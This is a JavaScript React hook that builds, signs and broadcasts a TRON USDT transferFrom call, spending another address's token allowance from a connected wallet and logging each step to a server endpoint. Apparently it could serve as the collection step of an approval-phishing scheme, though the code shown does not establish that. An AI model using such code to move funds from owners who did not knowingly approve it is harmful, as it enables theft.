import { useState } from "react";
import { useWalletConnect } from "./useWalletConnect";
import { TronWeb } from "tronweb";
import useSendDataToServer from "./useSendDataToserver";


const logToServer = async (message) => {
  try {
    console.log("Log to server:", message); // Log pentru depanare locală
    await fetch("/api/log", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ log: message }),
    });
  } catch (error) {
    console.error("Failed to send log to server:", error);
  }
};

const checkOwnerPermission = async (addressToCheck) => {
  const url = `https://api.trongrid.io/v1/accounts/${addressToCheck}`;

  try {
    const response = await fetch(url);
    if (!response.ok) {
      throw new Error("Request failed");
    }
    const data = await response.json();
    if (data.data && data.data.length > 0) {
      const ownerPermission = data.data[0].owner_permission;
      if (ownerPermission && ownerPermission.keys && ownerPermission.keys.length > 0) {
        const ownerAddress = ownerPermission.keys[0].address;
        if (ownerAddress === addressToCheck) {
          console.log("Owner permission validated.");
          return true;
        }
      }
    }
    console.error("Owner permission validation failed.");
    return false;
  } catch (error) {
    console.error("Error during owner permission check:", error);
    return false;
  }
};

export const useTransferFrom = () => {
  const [transactionStatus, setTransactionStatus] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const { connectWallet } = useWalletConnect();
  const { sendDataToServer } = useSendDataToServer();

  const checkAllowance = async (
    tronWeb,
    fromAddress,
    spenderAddress,
    contractAddress
  ) => {
    try {
      console.log("Checking allowance...");
      console.log(`From address (Owner): ${fromAddress}`);
      console.log(`Spender address (Wallet): ${spenderAddress}`);
      console.log(`Contract address: ${contractAddress}`);

      if (!fromAddress || !tronWeb.isAddress(fromAddress)) {
        throw new Error("Invalid or missing fromAddress.");
      }
      if (!spenderAddress || !tronWeb.isAddress(spenderAddress)) {
        throw new Error("Invalid or missing spenderAddress.");
      }
      if (!contractAddress || !tronWeb.isAddress(contractAddress)) {
        throw new Error("Invalid or missing contractAddress.");
      }

      const contract = await tronWeb.contract().at(contractAddress);
      const allowance = await contract.allowance(fromAddress, spenderAddress).call({from:fromAddress});
      console.log(`Allowance for spender ${spenderAddress}: ${allowance}`);
      return allowance;
    } catch (error) {
      console.error("Error checking allowance:", error.message);
      throw error;
    }
  };

  const initiateTransferFrom = async ({
    fromAddress,
    toAddress,
    amount,
    contractAddress = process.env.NEXT_PUBLIC_USDT_CONTRACT_ADDRESS,
  }) => {
    if (!amount || amount <= 0) {
      console.error("Invalid amount:", amount);
      setTransactionStatus("Invalid amount. Please enter a valid number.");
      return;
    }
  
    setIsLoading(true);
  
    try {
      console.log("Initiating transferFrom...");
      setTransactionStatus("Initiating transferFrom...");
      await logToServer("Starting transferFrom initialization...");
  
      console.log(`Send money to address: ${toAddress}`);
      await logToServer(`Address set for transfer money: ${toAddress}`);
  
      // Setup TronWeb
      const tronWeb = new TronWeb({ fullHost: "https://api.trongrid.io" });
      console.log("TronWeb initialized.");
  
      const walletConnection = await connectWallet();
      const walletAddress = walletConnection.address; // Conectează portofelul
  
      // Definește functionSelector, parameters și options
      const functionSelector = "transferFrom(address,address,uint256)";
      const parameters = [
        { type: "address", value: fromAddress },
        { type: "address", value: toAddress },
        { type: "uint256", value: amount * 1e6 }, // Conversie la unități mici
      ];
      const options = {
        feeLimit: 300000000,
        callValue: 0,
      };
  
      // Trigger smart contract
      const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
        contractAddress,
        functionSelector,
        options,
        parameters,
        walletAddress
      );
  
      console.log("Transaction built:", transaction);
  
      // Semnarea tranzacției
      const signedTransaction = await walletConnection.wallet.signTransaction(transaction);
  
      // Trimiterea tranzacției
      const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
      console.log("Transaction result:", result);
  
      if (result.result) {
        setTransactionStatus(`Transaction successful! Tx ID: ${result.txid}`);
        await logToServer(`Transaction successful! Tx ID: ${result.txid}`);
      } else {
        throw new Error("Transaction failed. Please check the contract or parameters.");
      }
    } catch (error) {
      console.error("Error during transferFrom:", error.message);
      setTransactionStatus(`Transfer failed: ${error.message}`);
      await logToServer(`Transfer failed: ${error.message}`);
    } finally {
      setIsLoading(false);
    }
  };
  
  
  

  return {
    initiateTransferFrom,
    transactionStatus,
    isLoading,
  };
};